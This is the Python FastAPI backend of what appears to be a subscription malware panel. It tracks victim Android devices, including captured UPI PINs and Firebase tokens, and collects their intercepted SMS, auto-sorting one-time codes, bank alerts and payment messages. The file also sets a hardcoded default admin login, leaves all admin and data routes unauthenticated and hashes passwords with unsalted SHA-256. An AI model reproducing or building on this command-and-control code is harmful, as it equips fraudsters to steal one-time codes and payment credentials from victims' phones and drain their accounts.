from fastapi import FastAPI, APIRouter, HTTPException, Depends
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field
from typing import List, Optional
import uuid
from datetime import datetime, timedelta
import hashlib

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ.get('DB_NAME', 'papiatma_panel')]

app = FastAPI(title="PapiAtma Panel API")
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== MODELS ====================

class UserBase(BaseModel):
    username: str
    role: str = "client"
    plan: str = "Basic"
    telegram_id: Optional[str] = None
    expiry_date: Optional[str] = None

class UserCreate(UserBase):
    password: str

class User(UserBase):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    created_at: str = Field(default_factory=lambda: datetime.utcnow().isoformat())
    is_active: bool = True

class UserLogin(BaseModel):
    username: str
    password: str

class UserUpdate(BaseModel):
    plan: Optional[str] = None
    expiry_date: Optional[str] = None
    telegram_id: Optional[str] = None
    is_active: Optional[bool] = None

class Device(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    name: str
    model: str
    status: str = "offline"
    upi_pin: Optional[str] = None
    battery: int = 100
    last_seen: str = Field(default_factory=lambda: datetime.utcnow().isoformat())
    added: str = Field(default_factory=lambda: datetime.utcnow().isoformat())
    note: str = "-"
    firebase_token: Optional[str] = None

class DeviceCreate(BaseModel):
    name: str
    model: str
    note: Optional[str] = "-"
    firebase_token: Optional[str] = None

class DeviceUpdate(BaseModel):
    name: Optional[str] = None
    model: Optional[str] = None
    status: Optional[str] = None
    upi_pin: Optional[str] = None
    battery: Optional[int] = None
    note: Optional[str] = None
    firebase_token: Optional[str] = None

class SmsMessage(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    device_id: str
    device_name: str
    sender: str
    message: str
    msg_type: str = "general"
    timestamp: str = Field(default_factory=lambda: datetime.utcnow().isoformat())
    is_read: bool = False

class SmsCreate(BaseModel):
    device_id: str
    sender: str
    message: str
    msg_type: Optional[str] = "general"

class FirebaseAccount(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    name: str
    project_id: str
    api_key: str
    status: str = "active"
    created_at: str = Field(default_factory=lambda: datetime.utcnow().isoformat())

class FirebaseCreate(BaseModel):
    name: str
    project_id: str
    api_key: str

class Session(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    user_id: str
    device_info: str
    ip: str
    location: str = "Unknown"
    is_current: bool = False
    last_active: str = Field(default_factory=lambda: datetime.utcnow().isoformat())

# ==================== HELPER FUNCTIONS ====================

def hash_password(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

def check_expiry(expiry_date: Optional[str]) -> bool:
    if not expiry_date:
        return False
    try:
        expiry = datetime.fromisoformat(expiry_date)
        return expiry < datetime.utcnow()
    except:
        return False

def format_datetime(dt: datetime) -> str:
    return dt.strftime("%d/%m/%Y | %I:%M %p")

# ==================== AUTH ROUTES ====================

@api_router.post("/auth/login")
async def login(data: UserLogin):
    user = await db.users.find_one({"username": data.username})
    if not user:
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    if user.get("password") != hash_password(data.password):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    if not user.get("is_active", True):
        raise HTTPException(status_code=403, detail="Account is deactivated")
    
    if user.get("role") != "admin" and check_expiry(user.get("expiry_date")):
        raise HTTPException(status_code=403, detail="Your account has expired. Contact admin.")
    
    # Remove password from response
    user.pop("password", None)
    user.pop("_id", None)
    
    return {"message": "Login successful", "user": user}

@api_router.post("/auth/register")
async def register(data: UserCreate):
    existing = await db.users.find_one({"username": data.username})
    if existing:
        raise HTTPException(status_code=400, detail="Username already exists")
    
    user_dict = data.dict()
    user_dict["id"] = str(uuid.uuid4())
    user_dict["password"] = hash_password(data.password)
    user_dict["created_at"] = datetime.utcnow().isoformat()
    user_dict["is_active"] = True
    
    await db.users.insert_one(user_dict)
    user_dict.pop("password")
    user_dict.pop("_id", None)
    
    return {"message": "User created", "user": user_dict}

# ==================== USER/CLIENT MANAGEMENT (ADMIN) ====================

@api_router.get("/admin/clients")
async def get_clients():
    clients = await db.users.find({"role": "client"}).to_list(1000)
    for c in clients:
        c.pop("_id", None)
        c.pop("password", None)
    return clients

@api_router.post("/admin/clients")
async def create_client(data: UserCreate):
    existing = await db.users.find_one({"username": data.username})
    if existing:
        raise HTTPException(status_code=400, detail="Username already exists")
    
    client_dict = data.dict()
    client_dict["id"] = str(uuid.uuid4())
    client_dict["password"] = hash_password(data.password)
    client_dict["role"] = "client"
    client_dict["created_at"] = datetime.utcnow().isoformat()
    client_dict["is_active"] = True
    
    await db.users.insert_one(client_dict)
    client_dict.pop("password")
    client_dict.pop("_id", None)
    
    return {"message": "Client created", "client": client_dict}

@api_router.put("/admin/clients/{client_id}")
async def update_client(client_id: str, data: UserUpdate):
    update_data = {k: v for k, v in data.dict().items() if v is not None}
    if not update_data:
        raise HTTPException(status_code=400, detail="No data to update")
    
    result = await db.users.update_one({"id": client_id}, {"$set": update_data})
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Client not found")
    
    return {"message": "Client updated"}

@api_router.delete("/admin/clients/{client_id}")
async def delete_client(client_id: str):
    result = await db.users.delete_one({"id": client_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Client not found")
    
    # Also delete client's devices and messages
    await db.devices.delete_many({"user_id": client_id})
    await db.messages.delete_many({"user_id": client_id})
    await db.firebase_accounts.delete_many({"user_id": client_id})
    
    return {"message": "Client deleted"}

@api_router.get("/admin/stats")
async def get_admin_stats():
    total_clients = await db.users.count_documents({"role": "client"})
    active_clients = await db.users.count_documents({"role": "client", "is_active": True})
    
    # Count expired
    all_clients = await db.users.find({"role": "client"}).to_list(1000)
    expired = sum(1 for c in all_clients if check_expiry(c.get("expiry_date")))
    
    premium = await db.users.count_documents({"role": "client", "plan": "Premium"})
    
    return {
        "total": total_clients,
        "active": active_clients - expired,
        "expired": expired,
        "premium": premium
    }

# ==================== DEVICE ROUTES ====================

@api_router.get("/devices/{user_id}")
async def get_devices(user_id: str):
    devices = await db.devices.find({"user_id": user_id}).to_list(1000)
    for d in devices:
        d.pop("_id", None)
    return devices

@api_router.get("/devices/{user_id}/stats")
async def get_device_stats(user_id: str):
    total = await db.devices.count_documents({"user_id": user_id})
    online = await db.devices.count_documents({"user_id": user_id, "status": "online"})
    offline = total - online
    with_pin = await db.devices.count_documents({"user_id": user_id, "upi_pin": {"$ne": None}})
    
    return {"total": total, "online": online, "offline": offline, "pin": with_pin}

@api_router.post("/devices/{user_id}")
async def create_device(user_id: str, data: DeviceCreate):
    device_dict = data.dict()
    device_dict["id"] = str(uuid.uuid4())
    device_dict["user_id"] = user_id
    device_dict["status"] = "offline"
    device_dict["battery"] = 100
    device_dict["last_seen"] = format_datetime(datetime.utcnow())
    device_dict["added"] = format_datetime(datetime.utcnow())
    
    await db.devices.insert_one(device_dict)
    device_dict.pop("_id", None)
    
    return {"message": "Device added", "device": device_dict}

@api_router.put("/devices/{device_id}")
async def update_device(device_id: str, data: DeviceUpdate):
    update_data = {k: v for k, v in data.dict().items() if v is not None}
    if "status" in update_data:
        update_data["last_seen"] = format_datetime(datetime.utcnow())
    
    result = await db.devices.update_one({"id": device_id}, {"$set": update_data})
    if result.modified_count == 0:
        raise HTTPException(status_code=404, detail="Device not found")
    
    return {"message": "Device updated"}

@api_router.delete("/devices/{device_id}")
async def delete_device(device_id: str):
    result = await db.devices.delete_one({"id": device_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Device not found")
    
    await db.messages.delete_many({"device_id": device_id})
    return {"message": "Device deleted"}

# ==================== SMS ROUTES ====================

@api_router.get("/sms/{user_id}")
async def get_sms(user_id: str, limit: int = 100):
    messages = await db.messages.find({"user_id": user_id}).sort("timestamp", -1).to_list(limit)
    for m in messages:
        m.pop("_id", None)
    return messages

@api_router.post("/sms/{user_id}")
async def create_sms(user_id: str, data: SmsCreate):
    device = await db.devices.find_one({"id": data.device_id})
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    msg_dict = data.dict()
    msg_dict["id"] = str(uuid.uuid4())
    msg_dict["user_id"] = user_id
    msg_dict["device_name"] = device.get("name", "Unknown")
    msg_dict["timestamp"] = format_datetime(datetime.utcnow())
    msg_dict["is_read"] = False
    
    # Auto-detect message type
    message_lower = data.message.lower()
    if "otp" in message_lower or "code" in message_lower:
        msg_dict["msg_type"] = "otp"
    elif "bank" in message_lower or "credited" in message_lower or "debited" in message_lower:
        msg_dict["msg_type"] = "bank"
    elif "payment" in message_lower or "upi" in message_lower:
        msg_dict["msg_type"] = "payment"
    
    await db.messages.insert_one(msg_dict)
    msg_dict.pop("_id", None)
    
    return {"message": "SMS saved", "sms": msg_dict}

@api_router.delete("/sms/{message_id}")
async def delete_sms(message_id: str):
    result = await db.messages.delete_one({"id": message_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Message not found")
    return {"message": "Message deleted"}

# ==================== FIREBASE ROUTES ====================

@api_router.get("/firebase/{user_id}")
async def get_firebase_accounts(user_id: str):
    accounts = await db.firebase_accounts.find({"user_id": user_id}).to_list(100)
    for a in accounts:
        a.pop("_id", None)
    return accounts

@api_router.post("/firebase/{user_id}")
async def create_firebase_account(user_id: str, data: FirebaseCreate):
    account_dict = data.dict()
    account_dict["id"] = str(uuid.uuid4())
    account_dict["user_id"] = user_id
    account_dict["status"] = "active"
    account_dict["created_at"] = datetime.utcnow().isoformat()
    
    await db.firebase_accounts.insert_one(account_dict)
    account_dict.pop("_id", None)
    
    return {"message": "Firebase account added", "account": account_dict}

@api_router.delete("/firebase/{account_id}")
async def delete_firebase_account(account_id: str):
    result = await db.firebase_accounts.delete_one({"id": account_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Account not found")
    return {"message": "Firebase account deleted"}

# ==================== SESSION ROUTES ====================

@api_router.get("/sessions/{user_id}")
async def get_sessions(user_id: str):
    sessions = await db.sessions.find({"user_id": user_id}).to_list(100)
    for s in sessions:
        s.pop("_id", None)
    return sessions

@api_router.delete("/sessions/{session_id}")
async def delete_session(session_id: str):
    result = await db.sessions.delete_one({"id": session_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Session not found")
    return {"message": "Session terminated"}

# ==================== SETTINGS ROUTES ====================

@api_router.put("/users/{user_id}/password")
async def change_password(user_id: str, old_password: str, new_password: str):
    user = await db.users.find_one({"id": user_id})
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    if user.get("password") != hash_password(old_password):
        raise HTTPException(status_code=400, detail="Incorrect old password")
    
    await db.users.update_one({"id": user_id}, {"$set": {"password": hash_password(new_password)}})
    return {"message": "Password changed"}

@api_router.put("/users/{user_id}")
async def update_user(user_id: str, telegram_id: Optional[str] = None):
    update_data = {}
    if telegram_id:
        update_data["telegram_id"] = telegram_id
    
    if update_data:
        await db.users.update_one({"id": user_id}, {"$set": update_data})
    
    return {"message": "Profile updated"}

# ==================== INIT DEFAULT ADMIN ====================

async def init_admin():
    # Create default admin if not exists
    admin = await db.users.find_one({"username": "papiatma"})
    if not admin:
        admin_data = {
            "id": str(uuid.uuid4()),
            "username": "papiatma",
            "password": hash_password("freefire123@"),
            "role": "admin",
            "plan": "Unlimited",
            "telegram_id": "@papiatma",
            "expiry_date": None,
            "created_at": datetime.utcnow().isoformat(),
            "is_active": True
        }
        await db.users.insert_one(admin_data)
        logger.info("Default admin created")

@app.on_event("startup")
async def startup_event():
    await init_admin()

@api_router.get("/")
async def root():
    return {"message": "PapiAtma Panel API v1.0"}

# Include router
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
